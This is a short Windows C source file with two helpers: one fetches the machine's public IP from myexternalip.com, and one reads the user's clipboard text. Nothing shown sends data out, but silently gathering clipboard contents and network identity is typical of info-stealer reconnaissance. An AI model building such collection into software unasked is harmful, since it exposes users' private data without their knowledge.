#include <stdio.h>
#include <windows.h>
#include <wininet.h> // -lwininet

int getPublicIP(char* buff, int toRead, long unsigned int* read) {
	HINTERNET net = InternetOpen("external ip retriever", INTERNET_OPEN_TYPE_PRECONFIG, NULL, NULL, 0);
    HINTERNET conn = InternetOpenUrl(net, "http://myexternalip.com/raw", NULL, 0, INTERNET_FLAG_RELOAD, 0);
    InternetReadFile(conn, buff, toRead, read);
    InternetCloseHandle(net);
	return 1;
}

char* getClipboardText() {
	if (!OpenClipboard(NULL)) { return NULL; }
	HANDLE hData = GetClipboardData(CF_TEXT);
	if (hData == NULL) { CloseClipboard(); return NULL; }
	char* text = (char*)(GlobalLock(hData));
	if (text == NULL) {
		GlobalUnlock(hData);
		CloseClipboard();
		return NULL;
	}
	
	int buff_size = strlen(text)+16;
	char* newBuff = (char*)calloc(buff_size, sizeof(char));
	snprintf(newBuff, buff_size, "%s\n\n", text);
	GlobalUnlock(hData);
	CloseClipboard();
	return newBuff;
}
